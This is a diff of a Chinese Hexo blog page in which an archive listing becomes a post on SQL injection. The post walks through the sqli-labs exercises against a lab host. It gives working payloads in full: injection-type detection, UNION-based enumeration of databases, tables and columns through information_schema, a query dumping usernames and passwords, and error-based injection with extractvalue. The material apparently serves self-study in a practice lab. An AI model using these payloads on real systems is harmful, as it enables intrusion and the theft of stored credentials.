@@ -8,7 +8,7 @@
     <link rel="apple-touch-icon" sizes="76x76" href="/null">
     <link rel="icon" type="image/png" href="/null">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
-    <title>归档 - Hexo</title>
+    <title>sql注入 - Hexo</title>
     
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     
@@ -404,53 +404,72 @@ header .header__right .dropdown-menus .dropdown-menu {
             
 
 <article class="page">
-  <div class="archive-list">
-    <p class="h4">共计 6 篇文章</p>
-    <hr>
+<div id="post-meta-m">
+    <div class="post-meta" id="post-meta">
+  <h3>sql注入</h3>
+    
+      <span class="post-meta-label">
+        John Doe
+      </span>
+    
+    
+      <span class="post-meta-label">
+        <span class="p-dot"></span>
+        <time datetime="2022-03-23 17:27" pubdate>
+          2022-03-23
+        </time>
+      </span>
     
     
       
-        
-        <p class="h5">2022</p>
-      
-      <a href="/2022/03/23/sql%E6%B3%A8%E5%85%A5/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">sql注入</span>
-        <time style="float: right;">03-23</time>
-      </a>
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        共 916 字
+      </span>
+    
+    
+    
+  </div>
+  
+</div>
+<div class="article-m">
+  <div class="post-toc">
     
       
-      <a href="/2022/03/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8F%92%E4%BB%B6/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">渗透测试插件</span>
-        <time style="float: right;">03-21</time>
-      </a>
     
+  </div>
+    <div id="article">
+      <div id="post-content" class="markdown-body textretty">
+        <p>sql注入<br>union联合注入(前四关关同理)<br>1.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=1&#39;">http://45.32.113.109:44709/Less-1/?id=1&#39;</a>   //报错,说明存在注入<br>2.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=1&#39;">http://45.32.113.109:44709/Less-1/?id=1&#39;</a>  and 1=1–+ //显示数据<br><a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=1&#39;">http://45.32.113.109:44709/Less-1/?id=1&#39;</a>  and 1=2–+ //没有显示数据，说明这是个基于单引号的字符型注入<br>判断是整形注入还是字符型注入<br>数字型注入与字符型注入的最大去区别在于<br>数字型不需要闭合，而字符型需要引号闭合<br>select * from table where id = 1   数字型<br>select * from table where username = ‘admin’   字符型<br>在第一关中上述可以，第二关中?id=1  and 1=1–+显示数据，id=1  and 1=2–+ //没有显示数据，说明这是个基于数值型注入<br>第三关中 向页面输入?id=1’,报错 ,发现报错信息中有括号闭合，那就变成 ?id=1’)  and 1=1–+显示数据，id=1’)  and 1=2–+ //没有显示数据，说明是(‘’)这种方式闭合字符串的<br>第四关中于第三关相同输入?id=1”,报错 ,发现报错信息中有括号闭合，那就变成?id=1”)  and 1=1–+显示数据，id=1”)  and 1=2–+ //没有显示数据，说明是(‘’)这种方式闭合字符串的  </p>
+<p>3.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=1&#39;">http://45.32.113.109:44709/Less-1/?id=1&#39;</a> order by 4–+  //分别进行从一开始的实验，找到有几个字段，order by 3回显正常 order by 4回显不正常说明存在3列数据( 在注释符被过滤的时候，ordey by查询语句，在用对应符号闭合会出现问题，可以使用联合查询的特性：UNION 内部的 SELECT 语句必须拥有相同数量的列,来确定字段数。?id=-1’ union select 1,2,3,4 –+多出的4超过了前面查询语句的列数就会报错：The used SELECT statements have a different number of columns)<br>4.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=-1&#39;">http://45.32.113.109:44709/Less-1/?id=-1&#39;</a> union select 1,2,3–+ //用来联合查询，但是只能输出后面的查询，所以把前面的查询结果为空值，显示2，3，说明可以使用2，3这两个位置。<br>5.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=-1&#39;">http://45.32.113.109:44709/Less-1/?id=-1&#39;</a> union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+ //查询所有数据库的名字（也可以直接用?id=-1’ union select 1,database(),3–+ 查询数据库）<br>6.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=-1&#39;">http://45.32.113.109:44709/Less-1/?id=-1&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3 –+ //查询数据库security中所有表名<br>7.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=-1&#39;">http://45.32.113.109:44709/Less-1/?id=-1&#39;</a> union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’users’) –+  //查询表users中的所有列名<br>8.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=-1&#39;">http://45.32.113.109:44709/Less-1/?id=-1&#39;</a> union select 1,2,(select group_concat(id,0x3a,username,0x3a,password) from users) –+  //查询表users中的所有信息（0x3a代表的是：）</p>
+<p>报错注入<br>● 该函数对xml文档进行查询。<br>● extractvalue(xml_frag,xpath_expr) 第一个参数式是查询内容，第二个参数是查询路径。<br>● 原理：当路径写入格式错误就会报错，显示出来，同时还会写入我们的非法查询语句并将查询的结果返回出来，所以在第二个参数位置构造sql语句进行注入<br>● and extractvalue(1, payload)<br>输出字符有长度限制，最长32位。<br>payload即我们要输入的sql查询语句<br><a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=1&#39;">http://45.32.113.109:44709/Less-1/?id=1&#39;</a> and (select extractvalue(1,concat(0x7e,(select user())))) –+  //更换select后的语句进行查询 （版本version()  数据库database()）<br><a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=1&#39;">http://45.32.113.109:44709/Less-1/?id=1&#39;</a> and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))) –+  //列如这样 里面语句和上面union一样</p>
+
+      </div>
+    </div>
+</div>
+
+
+<div class="post-footer">
+  
+  <div class="donate text-center">
+    <span></span>
+    <div class="donate-way">
       
-      <a href="/2022/03/15/mysql/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">mysql</span>
-        <time style="float: right;">03-15</time>
-      </a>
-    
-      
-      <a href="/2022/03/14/PHP/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">PHP</span>
-        <time style="float: right;">03-14</time>
-      </a>
-    
-      
-      <a href="/2022/03/14/Linux/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">Linux</span>
-        <time style="float: right;">03-14</time>
-      </a>
-    
-      
-      <a href="/2022/03/08/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">第一篇博客</span>
-        <time style="float: right;">03-08</time>
-      </a>
-    
+    </div>
+  </div>
+  
 
 </div>
+
+    <!-- Comments -->
+    <div class="comments">
+        
+        
+    </div>
+
 </article>
+
+
         </div>
         
 <footer class="text-center">
@@ -467,6 +486,8 @@ header .header__right .dropdown-menus .dropdown-menu {
 </footer>
 
 <div class="p-btn">
+    
+        <a class="toc-btn" id="toc-btn"><i id="i-menu"></i></a>
     
     <a href="#top" class="click-btn">
       <i id="i-up"></i>
@@ -502,8 +523,50 @@ header .header__right .dropdown-menus .dropdown-menu {
 </script>
 
 
+<script>
+    var postImg = document.querySelectorAll("article[class=page] img");
+    for (let imgi = 0; imgi < postImg.length; imgi++) {
+        postImg[imgi].onclick = () => {
+            let zoomImg = document.createElement("div");
+            zoomImg.id = "zoomImg";
+            zoomImg.innerHTML = `<div id="zoom-picture"></div>
+    <div class="poptrox-overlay"
+        style="position: fixed; left: 0px; top: 0px; z-index: 20000; width: 100%; height: 100%; text-align: center; cursor: zoom-out; opacity: 1;">
+        <div style="display:inline-block;height:100%;vertical-align:middle;"></div>
+        <div
+            style="position:absolute;left:0;top:0;width:100%;height:100%;background:#000000;opacity:0;filter:alpha(opacity=0);">
+        </div>
+        <div class="poptrox-popup"
+            style="display: inline-block; vertical-align: middle; position: relative; z-index: 1; cursor: zoom-out; min-width: 10px; min-height: 10px; width: auto; height: auto;">
+            <div class="loader" style="display: none;"></div>
+            <div class="pic" style="text-indent: 0px;"><img
+                    src="${ postImg[imgi].srcset || postImg[imgi].src }" alt="Loading..."
+                    style="vertical-align: bottom; max-width: 85vw; max-height: 85vh;"></div>
+        </div>
+    </div>`;
+            document.body.appendChild(zoomImg);
+                document.querySelector("#zoomImg").onclick = () => {
+                    document.querySelector("#zoomImg").remove();
+                }
+        }
+    }
+    
+</script>
 
 
+
+
+    <script>
+        query("#toc-btn")[0].onclick = () => {
+            if (query(".post-toc")[0].innerHTML) {
+                toggleClass(".post-toc", "display-inline");
+            }
+        }
+
+        if (!query(".post-toc")[0].innerHTML) {
+            addClass("#toc-btn","display-none");
+        }
+    </script>
 
 
 
